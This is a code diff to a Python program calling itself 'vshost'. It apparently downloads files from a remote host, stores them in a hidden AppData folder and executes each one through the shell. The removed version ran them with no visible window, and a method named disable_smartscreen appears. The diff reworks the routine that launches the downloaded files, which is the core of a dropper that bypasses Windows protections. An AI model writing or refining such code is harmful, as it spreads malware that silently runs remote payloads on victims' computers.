@@ -17,9 +17,9 @@ class Main:
 
     APP_NAME = "vshost"
     BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common' / 'python' / 'files'}"
+    FILES_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common' / 'python' / 'files' / 'files'}"
     FILES_TXT_URL = "http://files.akirottv.de"
 
-    BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
     APP_DIR = os.path.join(BASE_DIR, APP_NAME)
     os.makedirs(APP_DIR, exist_ok=True)
 
@@ -130,14 +130,13 @@ class Main:
                 print(f"{e}")
     
     def open_files(self):
-        for file_name in os.listdir(self.APP_DIR):
-            file_path = os.path.join(self.APP_DIR, file_name)
-            if os.path.isfile(file_path):
-                try:
-                    print(f"→ Opening {file_name}...")
-                    subprocess.run(['start', 'cmd', '/c', f'"{file_path}"'], shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW) #type: ignore
-                except Exception as e:
-                    print(f"{e}")
+        for file_name in pl.Path(self.FILES_DIR).iterdir():
+                if os.path.isfile(file_name):
+                    try:
+                        print(f"→ Opening {str(file_name)}...")
+                        print(subprocess.run(['start', file_name], cwd=self.FILES_DIR, shell=True, check=True))
+                    except Exception as e:
+                        print(f"{e}")
                     continue
     
     def disable_smartscreen(self):
